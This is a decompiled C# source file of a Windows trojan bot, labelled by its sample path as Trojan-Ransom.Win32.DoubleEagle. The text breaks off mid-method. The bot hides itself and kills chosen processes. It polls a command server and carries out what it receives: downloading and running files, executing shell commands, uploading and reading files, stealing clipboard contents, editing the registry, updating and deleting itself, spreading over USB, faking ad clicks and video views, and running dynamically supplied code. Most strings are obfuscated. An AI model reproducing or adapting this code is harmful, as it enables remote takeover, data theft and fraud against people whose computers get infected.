// Decompiled with JetBrains decompiler
// Type: a.MainForm
// Assembly: a, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F9E5355F-B81F-44C3-B871-657587613D56
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.DoubleEagle.oy-d5b498f54e9295f6ea542e3d341d03f3f4f4c5d98da494db89d0d61eb31c41a2.exe

using a.My;
using CmD6QmcsgiPn76lhP6;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using sfUewudEDLAUf4FcJb;
using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace a
{
  [DesignerGenerated]
  public class MainForm : Form
  {
    private IContainer components;
    [AccessedThroughProperty("MainTimer")]
    private System.Windows.Forms.Timer _MainTimer;
    [AccessedThroughProperty("CheckProssTimer")]
    private System.Windows.Forms.Timer _CheckProssTimer;
    private bool USBSpreadThreadIsRunning;
    private const long KEYEVENTF_KEYUP = 2;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public MainForm()
    {
      PLK895t5HgchDsN3oJ.YcBptkv3E60l7();
      // ISSUE: explicit constructor call
      base.\u002Ector();
      this.Load += new EventHandler(this.MainForm_Load);
      this.USBSpreadThreadIsRunning = false;
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    [MethodImpl(MethodImplOptions.NoInlining)]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.MainTimer = new System.Windows.Forms.Timer(this.components);
      this.CheckProssTimer = new System.Windows.Forms.Timer(this.components);
      this.SuspendLayout();
      this.MainTimer.Interval = 10000;
      this.CheckProssTimer.Enabled = true;
      this.CheckProssTimer.Interval = 10000;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(364, 202);
      this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = LSH1IvEDia2sKbWgPr.ySdEOnZ47(1958);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.ResumeLayout(false);
    }

    internal virtual System.Windows.Forms.Timer MainTimer
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this._MainTimer;
      [MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)] set
      {
        EventHandler eventHandler = new EventHandler(this.MainTimer_Tick);
        if (this._MainTimer != null)
          this._MainTimer.Tick -= eventHandler;
        this._MainTimer = value;
        if (this._MainTimer == null)
          return;
        this._MainTimer.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer CheckProssTimer
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this._CheckProssTimer;
      [MethodImpl(MethodImplOptions.Synchronized | MethodImplOptions.NoInlining)] set
      {
        EventHandler eventHandler = new EventHandler(this.CheckProssTimer_Tick);
        if (this._CheckProssTimer != null)
          this._CheckProssTimer.Tick -= eventHandler;
        this._CheckProssTimer = value;
        if (this._CheckProssTimer == null)
          return;
        this._CheckProssTimer.Tick += eventHandler;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void MainForm_Load(object sender, EventArgs e)
    {
      try
      {
        this.MainTimer.Interval = Conversions.ToInteger(Config.MainLoopInitival);
        if (Config.Debug)
          this.MainTimer.Interval = Conversions.ToInteger(LSH1IvEDia2sKbWgPr.ySdEOnZ47(1978));
        Config.ProsNotAllowed.Items.Add((object) LSH1IvEDia2sKbWgPr.ySdEOnZ47(1992));
        Config.ProsNotAllowed.Items.Add((object) LSH1IvEDia2sKbWgPr.ySdEOnZ47(2010));
        Config.ProsNotAllowed.Items.Add((object) LSH1IvEDia2sKbWgPr.ySdEOnZ47(2032));
        Config.ProsNotAllowed.Items.Add((object) LSH1IvEDia2sKbWgPr.ySdEOnZ47(2050));
        Config.ProsNotAllowed.Items.Add((object) LSH1IvEDia2sKbWgPr.ySdEOnZ47(2068));
        Config.ProsNotAllowed.Items.Add((object) LSH1IvEDia2sKbWgPr.ySdEOnZ47(2082));
        Config.ProsNotAllowed.Items.Add((object) LSH1IvEDia2sKbWgPr.ySdEOnZ47(2098));
        Control.CheckForIllegalCrossThreadCalls = false;
        CheckProcesses.Check();
        if (!Config.Debug)
        {
          try
          {
            MyProject.Computer.FileSystem.GetFileInfo(Application.ExecutablePath).Attributes = FileAttributes.Hidden | FileAttributes.System;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        while (Operators.ConditionalCompareObjectEqual(WEB.connect(), (object) false, false))
          Thread.Sleep(Conversions.ToInteger(Config.SleepInitival));
        this.MainTimer.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.EndApp();
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void MainTimer_Tick(object sender, EventArgs e)
    {
      try
      {
        string Left = Conversions.ToString(WEB.ReadCommando());
        if (Operators.CompareString(Left, LSH1IvEDia2sKbWgPr.ySdEOnZ47(2116), false) == 0)
        {
          this.ResetAndConnect();
        }
        else
        {
          try
          {
            if (!Config.Debug)
              this.MainTimer.Interval = Conversions.ToInteger(Left.Split('\n')[0].Replace(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2126), ""));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          if (Operators.CompareString(Left, "", false) == 0)
            return;
          string[] strArray = Left.Split('\n')[1].Split('|');
          long index = 0;
          while (index != (long) strArray.Length)
          {
            if (Config.notagainlist.Contains((object) strArray[checked ((int) index)]))
            {
              checked { ++index; }
            }
            else
            {
              if (!strArray[checked ((int) index)].EndsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2132)))
                Config.notagainlist.Add((object) strArray[checked ((int) index)]);
              strArray[checked ((int) index)] = Strings.Replace(strArray[checked ((int) index)], LSH1IvEDia2sKbWgPr.ySdEOnZ47(2140), "");
              this.CheckAction(strArray[checked ((int) index)], strArray[checked ((int) index)].Split(';'));
              checked { ++index; }
            }
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        bool flag = false;
        Process[] processes = Process.GetProcesses();
        int num = checked (processes.Length - 1);
        int index = 0;
        while (index <= num)
        {
          if (Operators.CompareString(Strings.UCase(processes[index].ProcessName), Strings.UCase(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2146)), false) == 0)
          {
            processes[index].Kill();
            flag = true;
          }
          checked { ++index; }
        }
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void CheckAction(string Commando, string[] args)
    {
      try
      {
        if (Commando.ToString().StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2158)))
        {
          try
          {
            if (Operators.CompareString(args[2], LSH1IvEDia2sKbWgPr.ySdEOnZ47(2172), false) == 0)
            {
              Interaction.Shell(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2186) + Config.FolderPath + LSH1IvEDia2sKbWgPr.ySdEOnZ47(2192) + Commando, AppWinStyle.Hide);
              WEB.SendSucsess();
            }
            if (Operators.CompareString(args[2], LSH1IvEDia2sKbWgPr.ySdEOnZ47(2216), false) == 0)
            {
              try
              {
                bool flag = false;
                Process[] processes = Process.GetProcesses();
                int num = checked (processes.Length - 1);
                int index = 0;
                while (index <= num)
                {
                  if (Operators.CompareString(Strings.UCase(processes[index].ProcessName), Strings.UCase(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2228)), false) == 0)
                  {
                    processes[index].Kill();
                    flag = true;
                  }
                  checked { ++index; }
                }
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              WEB.SendSucsess();
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            WEB.SendError();
            ProjectData.ClearProjectError();
          }
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2240)))
        {
          try
          {
            Thread.Sleep(checked ((int) Math.Round((double) Conversion.Int(unchecked (VBMath.Rnd() * 900000f)))));
            if (Operators.CompareString(args[3], LSH1IvEDia2sKbWgPr.ySdEOnZ47(2262), false) == 0)
            {
              MyProject.Computer.Network.DownloadFile(args[1], args[2]);
              Interaction.Shell(args[2], AppWinStyle.Hide);
            }
            else
              MyProject.Computer.Network.DownloadFile(args[1], args[2]);
            WEB.SendSucsess();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            WEB.SendError();
            ProjectData.ClearProjectError();
          }
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2268)))
        {
          try
          {
            WEB.SendComment(Environment.UserName);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            WEB.SendError();
            ProjectData.ClearProjectError();
          }
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2290)))
        {
          try
          {
            WEB.SendComment(MyProject.Computer.Info.InstalledUICulture.IetfLanguageTag.ToString() + LSH1IvEDia2sKbWgPr.ySdEOnZ47(2304) + MyProject.Computer.Info.OSFullName);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            WEB.SendError();
            ProjectData.ClearProjectError();
          }
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2310)))
        {
          try
          {
            if (Conversions.ToLong(args[2]) > Conversions.ToLong(Config.BotVer))
            {
              Thread.Sleep(checked ((int) Math.Round((double) Conversion.Int(unchecked (VBMath.Rnd() * 900000f)))));
              try
              {
                MyProject.Computer.FileSystem.DeleteFile(Config.UpdateFile);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              if (Config.Debug)
              {
                VBMath.Randomize();
                Config.UpdateFile = Config.UpdateFile + Conversion.Int(VBMath.Rnd() * 100000f).ToString() + LSH1IvEDia2sKbWgPr.ySdEOnZ47(2328);
                MyProject.Computer.Network.DownloadFile(args[1], Config.UpdateFile);
              }
              else
                MyProject.Computer.Network.DownloadFile(args[1], Config.UpdateFile);
              if (Operators.CompareString(this.MD5CalcFile(Config.UpdateFile), args[3], false) != 0)
              {
                WEB.SendError();
                return;
              }
              try
              {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Config.RegStartup.Substring(checked (Config.RegStartup.IndexOf(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2340)) + 1), checked (Config.RegStartup.Length - Config.RegStartup.IndexOf(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2346)) + 1)), true);
                registryKey.DeleteValue(Config.RegName, true);
                registryKey.Close();
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              WEB.SendSucsess();
              Thread.Sleep(5000);
              Interaction.Shell(Config.UpdateFile);
              ProjectData.EndApp();
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            WEB.SendError();
            ProjectData.ClearProjectError();
          }
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2352)))
        {
          try
          {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Config.RegStartup.Substring(checked (Config.RegStartup.IndexOf(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2370)) + 1), checked (Config.RegStartup.Length - Config.RegStartup.IndexOf(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2376)) + 1)), true);
            registryKey.DeleteValue(Config.RegName, true);
            registryKey.Close();
            try
            {
              if (Config.TryCopToStartFolder)
                MyProject.Computer.FileSystem.DeleteFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + LSH1IvEDia2sKbWgPr.ySdEOnZ47(2382) + Config.StartupFolderExeName);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            WEB.SendSucsess();
            Thread.Sleep(2000);
            try
            {
              string str = "";
              int num = 0;
              do
              {
                str += LSH1IvEDia2sKbWgPr.ySdEOnZ47(2388);
                checked { ++num; }
              }
              while (num <= 200);
              string text = str + LSH1IvEDia2sKbWgPr.ySdEOnZ47(2424) + Config.FilePath + LSH1IvEDia2sKbWgPr.ySdEOnZ47(2438);
              try
              {
                MyProject.Computer.FileSystem.DeleteFile(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2444));
                MyProject.Computer.FileSystem.WriteAllText(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2462), text, false);
                Interaction.Shell(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2480), AppWinStyle.Hide);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            ProjectData.EndApp();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            WEB.SendError();
            ProjectData.ClearProjectError();
          }
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2498)))
        {
          try
          {
            Interaction.Shell(args[1]);
            WEB.SendSucsess();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            WEB.SendError();
            ProjectData.ClearProjectError();
          }
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2510)))
        {
          try
          {
            MyProject.Computer.Network.UploadFile(args[1], args[2], args[3], args[4]);
            WEB.SendSucsess();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            WEB.SendError();
            ProjectData.ClearProjectError();
          }
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2528)))
        {
          try
          {
            WEB.SendComment(MyProject.Computer.FileSystem.ReadAllText(args[1]));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            WEB.SendError();
            ProjectData.ClearProjectError();
          }
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2550)))
        {
          try
          {
            MyProject.Computer.FileSystem.WriteAllText(args[1], args[2], false);
            WEB.SendSucsess();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            WEB.SendError();
            ProjectData.ClearProjectError();
          }
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2574)))
        {
          try
          {
            bool flag = false;
            Process[] processes = Process.GetProcesses();
            int num = checked (processes.Length - 1);
            int index = 0;
            while (index <= num)
            {
              if (Operators.CompareString(Strings.UCase(processes[index].ProcessName), Strings.UCase(args[1].ToLower()), false) == 0)
              {
                processes[index].Kill();
                flag = true;
              }
              checked { ++index; }
            }
            WEB.SendSucsess();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            WEB.SendError();
            ProjectData.ClearProjectError();
          }
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2588)))
        {
          try
          {
            WEB.SendComment(Conversions.ToString(MyProject.Computer.Registry.GetValue(args[1], args[2], (object) "")));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            WEB.SendError();
            ProjectData.ClearProjectError();
          }
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2608)))
        {
          try
          {
            MyProject.Computer.Registry.SetValue(args[1], args[2], (object) args[3]);
            WEB.SendSucsess();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            WEB.SendError();
            ProjectData.ClearProjectError();
          }
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2630)))
        {
          try
          {
            WEB.SendComment(Encoding.ASCII.GetString(new WebClient().DownloadData(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2640))));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            WEB.SendError();
            ProjectData.ClearProjectError();
          }
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2702)))
        {
          try
          {
            WEB.SendComment(Dns.GetHostAddresses(MyProject.Computer.Name)[0].ToString());
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            WEB.SendError();
            ProjectData.ClearProjectError();
          }
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2714)))
        {
          try
          {
            if (Operators.CompareString(MyProject.Computer.Clipboard.GetText(), "", false) != 0)
              WEB.SendComment(MyProject.Computer.Clipboard.GetText());
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            WEB.SendError();
            ProjectData.ClearProjectError();
          }
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2734)))
        {
          try
          {
            MyProject.Computer.Clipboard.SetText(args[1]);
            WEB.SendSucsess();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            WEB.SendError();
            ProjectData.ClearProjectError();
          }
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2754)))
        {
          try
          {
            Config.notagainlist.Clear();
            WEB.SendSucsess();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            WEB.SendError();
            ProjectData.ClearProjectError();
          }
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2772)))
          ProjectData.EndApp();
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2784)))
        {
          try
          {
            if (args[1].StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2804)) | args[1].StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2822)))
            {
              Process.Start(args[1]);
              WEB.SendSucsess();
            }
            else
              WEB.SendError();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            WEB.SendError();
            ProjectData.ClearProjectError();
          }
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2842)))
        {
          try
          {
            Interaction.Shell(Config.FilePath);
            WEB.SendSucsess();
            ProjectData.EndApp();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            WEB.SendError();
            ProjectData.ClearProjectError();
          }
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2862)))
        {
          try
          {
            if (Encoding.ASCII.GetString(new WebClient()
            {
              Headers = {
                {
                  LSH1IvEDia2sKbWgPr.ySdEOnZ47(2890),
                  LSH1IvEDia2sKbWgPr.ySdEOnZ47(2918)
                }
              }
            }.DownloadData(LSH1IvEDia2sKbWgPr.ySdEOnZ47(2988))).Contains(LSH1IvEDia2sKbWgPr.ySdEOnZ47(3066) + args[1]))
            {
              RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Config.RegStartup.Substring(checked (Config.RegStartup.IndexOf(LSH1IvEDia2sKbWgPr.ySdEOnZ47(3120)) + 1), checked (Config.RegStartup.Length - Config.RegStartup.IndexOf(LSH1IvEDia2sKbWgPr.ySdEOnZ47(3126)) + 1)), true);
              registryKey.DeleteValue(Config.RegName, true);
              registryKey.Close();
              try
              {
                if (Config.TryCopToStartFolder)
                  MyProject.Computer.FileSystem.DeleteFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + LSH1IvEDia2sKbWgPr.ySdEOnZ47(3132) + Config.StartupFolderExeName);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              WEB.SendSucsess();
              Thread.Sleep(2000);
              string str = "";
              int num = 0;
              do
              {
                str += LSH1IvEDia2sKbWgPr.ySdEOnZ47(3138);
                checked { ++num; }
              }
              while (num <= 200);
              string text = str + LSH1IvEDia2sKbWgPr.ySdEOnZ47(3174) + Config.FilePath + LSH1IvEDia2sKbWgPr.ySdEOnZ47(3188);
              try
              {
                MyProject.Computer.FileSystem.DeleteFile(LSH1IvEDia2sKbWgPr.ySdEOnZ47(3194));
                MyProject.Computer.FileSystem.WriteAllText(LSH1IvEDia2sKbWgPr.ySdEOnZ47(3212), text, false);
                Interaction.Shell(LSH1IvEDia2sKbWgPr.ySdEOnZ47(3230), AppWinStyle.Hide);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              ProjectData.EndApp();
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            WEB.SendError();
            ProjectData.ClearProjectError();
          }
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(3248)))
        {
          try
          {
            MyProject.Computer.FileSystem.DeleteFile(args[1]);
            WEB.SendSucsess();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            WEB.SendError();
            ProjectData.ClearProjectError();
          }
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(3260)) && Operators.CompareString(args[1], LSH1IvEDia2sKbWgPr.ySdEOnZ47(3278), false) == 0 && !this.USBSpreadThreadIsRunning)
        {
          new Thread(new ThreadStart(this.USBSpread)).Start();
          this.USBSpreadThreadIsRunning = true;
          WEB.SendSucsess();
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(3288)))
        {
          string Commando1 = Encoding.ASCII.GetString(new WebClient()
          {
            Headers = {
              {
                LSH1IvEDia2sKbWgPr.ySdEOnZ47(3304),
                LSH1IvEDia2sKbWgPr.ySdEOnZ47(3332)
              }
            }
          }.DownloadData(args[1]));
          this.CheckAction(Commando1, Commando1.Split(';'));
          WEB.SendSucsess();
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(3402)))
        {
          WebBrowser webBrowser1 = new WebBrowser();
          webBrowser1.Navigating += new WebBrowserNavigatingEventHandler(this.WebBrowser1_Navigating);
          webBrowser1.Navigate(args[1]);
          int num1 = 0;
          do
          {
            Application.DoEvents();
            Thread.Sleep(1);
            checked { ++num1; }
          }
          while (num1 <= 2000);
          while (webBrowser1.IsBusy && !webBrowser1.DocumentText.Contains(LSH1IvEDia2sKbWgPr.ySdEOnZ47(3422)))
          {
            Application.DoEvents();
            Thread.Sleep(1);
          }
          if (Config.links.Count != 0)
          {
            WebBrowser webBrowser2 = new WebBrowser();
            WebBrowser Instance = webBrowser2;
            string MemberName = LSH1IvEDia2sKbWgPr.ySdEOnZ47(3440);
            object[] objArray1 = new object[1];
            object[] objArray2 = objArray1;
            ArrayList links = Config.links;
            ArrayList arrayList1 = links;
            float a = Conversion.Int((float) ((double) VBMath.Rnd() * (double) Config.links.Count - 1.0));
            int index1 = checked ((int) Math.Round((double) a));
            object objectValue = RuntimeHelpers.GetObjectValue(arrayList1[index1]);
            objArray2[0] = objectValue;
            object[] objArray3 = objArray1;
            object[] Arguments = objArray3;
            bool[] flagArray = new bool[1]{ true };
            bool[] CopyBack = flagArray;
            NewLateBinding.LateCall((object) Instance, (System.Type) null, MemberName, Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
            if (flagArray[0])
              links[checked ((int) Math.Round((double) a))] = RuntimeHelpers.GetObjectValue(objArray3[0]);
            int num2 = 0;
            do
            {
              Thread.Sleep(1);
              Application.DoEvents();
              checked { ++num2; }
            }
            while (num2 <= 2000);
            ArrayList arrayList2 = new ArrayList();
            int num3 = checked (webBrowser1.Document.Links.Count - 1);
            int index2 = 0;
            while (index2 <= num3)
            {
              if (webBrowser1.Document.Links[index2].GetAttribute(LSH1IvEDia2sKbWgPr.ySdEOnZ47(3460)).Contains(LSH1IvEDia2sKbWgPr.ySdEOnZ47(3472)))
                arrayList2.Add((object) index2.ToString());
              checked { ++index2; }
            }
            VBMath.Randomize((double) new Random().Next());
            NewLateBinding.LateCall(NewLateBinding.LateGet((object) webBrowser2.Document.Links, (System.Type) null, LSH1IvEDia2sKbWgPr.ySdEOnZ47(3484), new object[1]
            {
              RuntimeHelpers.GetObjectValue(arrayList2[checked ((int) Math.Round((double) Conversion.Int((float) unchecked ((double) VBMath.Rnd() * (double) arrayList2.Count - 1.0))))])
            }, (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, LSH1IvEDia2sKbWgPr.ySdEOnZ47(3496), new object[1]
            {
              (object) LSH1IvEDia2sKbWgPr.ySdEOnZ47(3524)
            }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
            int num4 = 0;
            do
            {
              Thread.Sleep(1);
              Application.DoEvents();
              checked { ++num4; }
            }
            while (num4 <= 2000);
            WEB.SendSucsess();
          }
          else
            WEB.SendError();
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(3538)))
        {
          WebBrowser webBrowser = new WebBrowser();
          webBrowser.Navigate(args[1]);
          int num = 0;
          do
          {
            Application.DoEvents();
            Thread.Sleep(1);
            checked { ++num; }
          }
          while (num <= 500);
          while (!webBrowser.IsAccessible)
          {
            Application.DoEvents();
            Thread.Sleep(1);
          }
          WEB.SendSucsess();
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(3558)))
        {
          Thread thread = new Thread((ParameterizedThreadStart) (a0 => this.youtube(Conversions.ToString(a0))));
          thread.SetApartmentState(ApartmentState.STA);
          thread.Start((object) (args[1] + LSH1IvEDia2sKbWgPr.ySdEOnZ47(3578) + args[2] + LSH1IvEDia2sKbWgPr.ySdEOnZ47(3584) + args[3] + LSH1IvEDia2sKbWgPr.ySdEOnZ47(3590)));
          WEB.SendSucsess();
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(3596)))
        {
          if (Operators.CompareString(args[1], LSH1IvEDia2sKbWgPr.ySdEOnZ47(3614), false) == 0)
          {
            Config.silent = true;
            WEB.SendSucsess();
          }
          else if (Operators.CompareString(args[1], LSH1IvEDia2sKbWgPr.ySdEOnZ47(3626), false) == 0)
          {
            Config.silent = false;
            WEB.SendError();
          }
        }
        if (Commando.StartsWith(LSH1IvEDia2sKbWgPr.ySdEOnZ47(3640)))
        {
          string str = DynamicCode.runcode(args[1]).ToString();
          if (Operators.CompareString(str, LSH1IvEDia2sKbWgPr.ySdEOnZ47(3672), false) == 0)
            WEB.SendSucsess();
          else
            WEB.SendComment(str);
        }
        Commando = "";
        args = (string[]) null;
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        try
        {
          WEB.SendError();
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
      }
    }

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void mute()
    {
      while (true)
      {
        Thread.Sleep(1);
        Application.DoEvents();
        MainForm.keybd_event((byte) 174, (byte) 0, 0, 0);
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void youtube(string args)
    {
      Thread thread = new Thread(new ThreadStart(this.mute));
      thread.Start();
      int integer = Conversions.ToInteger(args.Split(';')[1]);
      int num1 = 0;
      while (num1 <= integer)
      {
        new WebBrowser().Navigate(args.Split(';')[0]);
        int num2 = 0;
        do
        {
          Thread.Sleep(1);
          Application.DoEvents();
          checked { ++num2; }
        }
        while (num2 <= 2000);
        DateTime t2 = DateTime.Now.AddMinutes(Conversions.ToDouble(args.Split(';')[2]));
        while (DateTime.Compare(DateTime.Now, t2) <= 0)
        {
          Thread.Sleep(1);
          Application.DoEvents();
        }
        checked { ++num1; }
      }
      thread.Abort();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void WebBrowser1_Navigating(object sender, WebBrowserNavigatingEventArgs e)
    {
      if (!e.Url.AbsoluteUri.Contains(LSH1IvEDia2sKbWgPr.ySdEOnZ47(3678)))
        return;
      e.Cancel = true;
      int num = 0;
      do
      {
        e.Cancel = true;
        Thread.Sleep(1);
        Application.DoEvents();
        checked { ++num; }
      }
      while (num <= 2500);
      if (!e.Url.AbsoluteUri.Contains(LSH1IvEDia2sKbWgPr.ySdEOnZ47(3700)))
        return;
      Config.links.Add((object) e.Url.AbsoluteUri);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public string MD5CalcFile(string filepath)
    {
      using (FileStream inputStream = new FileStream(filepath, FileMode.Open, FileAccess.Read))
      {
        using (MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider())
          return this.ByteArrayToString(cryptoServiceProvider.ComputeHash((Stream) inputStream));
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private string ByteArrayToString(byte[] arrInput)
    {
      StringBuilder stringBuilder = new StringBuilder(checked (arrInput.Length * 2));
      int num = checked (arrInput.Length - 1);
      int index = 0;
      while (index <= num)
      {
        stringBuilder.Append(arrInput[index].ToString(LSH1IvEDia2sKbWgPr.ySdEOnZ47(3726)));
        checked { ++index; }
      }
      return stringBuilder.ToString().ToLower();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void ResetAndConnect()
    {
      try
      {
        this.MainTimer.Stop();
        while (Operators.ConditionalCompareObjectEqual(WEB.connect(), (object) false, false))
